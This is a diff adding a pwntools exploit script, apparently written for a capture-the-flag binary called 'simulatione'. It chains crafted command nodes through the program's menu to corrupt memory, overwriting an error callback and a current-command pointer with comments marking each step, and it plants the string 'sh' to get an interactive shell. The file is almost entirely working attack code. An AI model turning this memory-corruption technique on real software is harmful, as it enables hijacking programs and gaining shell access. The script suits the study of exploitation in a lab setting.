@@ -1,0 +1,175 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./simulatione")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+context.binary = exe
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript=f"""
+    # brva 0x0000000000001DD1
+    brva 0x00000000000022F3
+    brva 0x0000000000001393
+    brva 0x0000000000001316
+    brva 0x0000000000001D9A
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def new(idx,nb,nextnode,command,handle="y",handler=""):
+    sa(">","1")
+    sa(":",str(idx))
+    sa("command:",str(nb))
+    sa("Next node:",str(nextnode))
+    sa("command list:",command)
+    if handle == "y":
+        sa("default handler? (y/n):","y")
+        sa(":","2")
+    if handle == "n":
+        print(handle)
+        sa("default handler? (y/n):","n")
+        sa(" error handler:",handler)
+# cmd = p64(4)+p64(1)+p64(4)
+cmd = flat(
+    1, 
+    0, 0,
+    0, 1,
+    2, 0x200 # create gap 
+)
+new(1,1,2,cmd,"n","0")
+cmd = flat(
+    1, 
+    0, 0x6873,
+    0, 0,
+    2, 0
+)
+new(2,1,3,cmd,"n","0")
+cmd = flat(
+    1, 
+    0, 1,
+    0, 0,
+    2, 0x18
+)
+new(3,1,4,cmd,"n","0")
+cmd = flat(
+    1, 
+    0, 1,
+    0, 0,
+    2, 0x8
+)
+new(4,1,5,cmd,"n","0")
+
+cmd = flat(
+    1, 
+    0, 0xfffffffffffffef0, # value 1
+    0, 0,
+    2, 0x28 
+)
+new(5,1,7,cmd,"n","0")
+
+# cmd = flat(
+#     1, 
+#     0, 0xffffffff,
+#     0, 0,
+#     2, 0x2c 
+# )
+# new(6,1,7,cmd,"n","0")
+cmd = flat(
+    1, 
+    0, 1,
+    0, 0,
+    2, 0x20 # value type
+)
+new(7,1,8,cmd,"n","0")
+
+cmd = flat(
+    1, 
+    0, 0x1c9a20,
+    0, 0,
+    2, 0x38 
+)
+new(8,1,9,cmd,"n","0")
+
+cmd = flat(
+    1, 
+    0, 2,
+    0, 0,
+    2, 0x40 
+)
+new(9,1,10,cmd,"n","0")
+offset_handler = 0x10
+
+cmd = flat(
+    1, 
+    0, offset_handler,
+    0, 0,
+    2, 0x48 
+)# overwrite error_callback
+new(10,1,12,cmd,"n","0")
+# cmd = flat(
+#     1, 
+#     0, 0xffffffff,
+#     0, 0,
+#     2, 0x4c 
+# ) # overwrite error_callback
+# new(11,1,12,cmd,"n","0")
+next_node = 14
+cmd = flat(
+    1, 
+    0, next_node,
+    0, 0,
+    2, 0xc
+) # next node
+new(12,1,13,cmd,"n","0")
+
+offset_mem = str(0x109)
+cmd = flat(
+    4, 
+    0, 0,
+    0, 0,
+    0, 0 
+)
+new(13,1,0,cmd,"n",offset_mem)
+
+cmd = flat(
+    1, 
+    0, 4,
+    0, 0,
+    2, 0x18
+)
+new(14,1,15,cmd,"n","0") # change cmd
+
+cmd = flat(
+    1, 
+    0, 0x0000000100000000,
+    0, 0,
+    2, 4
+)
+new(15,1,13,cmd,"n","0") # zero out cur_cmd
+
+gdbs()
+print("running")
+sla(">","2")
+sla(" start?","1")
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
